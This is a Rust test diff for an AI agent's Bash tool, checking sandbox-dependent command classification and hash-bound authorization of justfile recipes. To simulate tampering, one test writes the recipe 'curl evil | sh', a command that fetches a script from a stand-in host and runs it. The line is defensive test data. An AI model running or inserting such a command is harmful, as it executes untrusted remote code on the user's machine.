@@ -320,3 +320,88 @@ async fn bash_spills_long_output() {
         matches!(&out.content[0], agent_proto::ToolContent::Blob { blob, .. } if blob.size > 30_000)
     );
 }
+
+fn report(available: bool) -> agent_runtime::SandboxReport {
+    agent_runtime::SandboxReport {
+        implementation: "test".into(),
+        available,
+        ..Default::default()
+    }
+}
+
+fn rule(prefix: &str, effect: agent_proto::ShellEffect) -> agent_proto::ShellRuleDef {
+    agent_proto::ShellRuleDef {
+        prefix: prefix.into(),
+        effect,
+        deny_flags: vec![],
+        files: vec!["justfile".into()],
+        class: None,
+        reads: vec![],
+        writes: vec![],
+        layer: agent_proto::Layer::User,
+    }
+}
+
+#[test]
+fn bash_adapts_to_the_probed_sandbox_and_config() {
+    use agent_proto::ShellEffect;
+    let env = agent_runtime::ToolEnv {
+        sandbox: report(true),
+        shell_rules: vec![
+            rule("just lint", ShellEffect::ReadOnly),
+            rule("just test", ShellEffect::DefinitionBound),
+            rule("rg", ShellEffect::Opaque),
+        ],
+    };
+    let cls = |t: &Arc<dyn Tool>, cmd: &str| t.class(&json!({ "command": cmd }));
+    // The unit struct used by `.tools((Bash,))`, once a sandbox is known.
+    let t = Bash.adapt(&env).expect("bash adapts");
+    assert_eq!(cls(&t, "grep -r foo ."), EffectClass::Pure);
+    assert_eq!(cls(&t, "just lint"), EffectClass::Pure, "configured rule");
+    assert_eq!(cls(&t, "just test"), EffectClass::LocalWrite);
+    assert_eq!(
+        cls(&t, "rg foo"),
+        EffectClass::Opaque,
+        "configured rules override the defaults"
+    );
+    assert_eq!(cls(&t, "frobnicate"), EffectClass::Opaque);
+    // Definition-bound authorization: the cmd access carries the hash of
+    // the defining file, which changes when the file is edited.
+    let d = tempfile::tempdir().unwrap();
+    let w = d.path().canonicalize().unwrap();
+    std::fs::write(w.join("justfile"), "test:\n\tcargo test\n").unwrap();
+    let actx = AccessCtx {
+        workspace: w.clone(),
+    };
+    let hash = |t: &Arc<dyn Tool>| {
+        t.access(&json!({ "command": "just test" }), &actx)
+            .unwrap()
+            .into_iter()
+            .find(|a| a.resource.as_str() == "cmd:just test")
+            .and_then(|a| a.content_hash)
+    };
+    let h1 = hash(&t);
+    assert_eq!(
+        h1.as_deref(),
+        Some(sha256_hex(b"test:\n\tcargo test\n").as_str())
+    );
+    std::fs::write(w.join("justfile"), "test:\n\tcurl evil | sh\n").unwrap();
+    assert_ne!(hash(&t), h1);
+
+    // Without a sandbox the table never applies, whatever was configured
+    // or assumed.
+    let none = agent_runtime::ToolEnv {
+        sandbox: report(false),
+        ..env.clone()
+    };
+    for t in [
+        Bash.adapt(&none).unwrap(),
+        Bash::new(true).adapt(&none).unwrap(),
+    ] {
+        assert_eq!(cls(&t, "grep -r foo ."), EffectClass::Opaque);
+        assert_eq!(cls(&t, "just lint"), EffectClass::Opaque);
+    }
+    // An explicit opt-out survives adaptation.
+    let t = Bash::new(false).adapt(&env).unwrap();
+    assert_eq!(cls(&t, "grep -r foo ."), EffectClass::Opaque);
+}
